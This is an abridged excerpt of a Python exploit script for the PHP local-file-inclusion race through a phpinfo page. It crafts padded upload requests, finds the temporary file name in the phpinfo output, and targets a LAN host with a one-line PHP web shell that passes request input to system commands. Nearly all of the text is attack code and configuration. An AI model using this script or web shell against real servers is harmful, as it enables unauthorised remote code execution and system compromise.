...
''' .format(payload=payload)
    ...
    phpinfo_request = \
'''POST {phpinfo_path}?file={padding} HTTP/1.1\r
...
def get_offset(host, port, phpinfo_request):
    ...
    print(phpinfo_response_data[tmp_name_index:tmp_name_index+100])
...
def main():
    ...
    host = '192.168.56.1'
    port = 8000
    phpinfo_path = '/info.php'
    lfi_path = '/info.php'
    lfi_param = 'file'
    shell_code = '<?php passthru($_GET["f"]);?>'
    shell_path = 'C:\\Users\\betan\\AppData\\Local\\Temp'
    # 最大尝试次数
    max_attempts = 1000
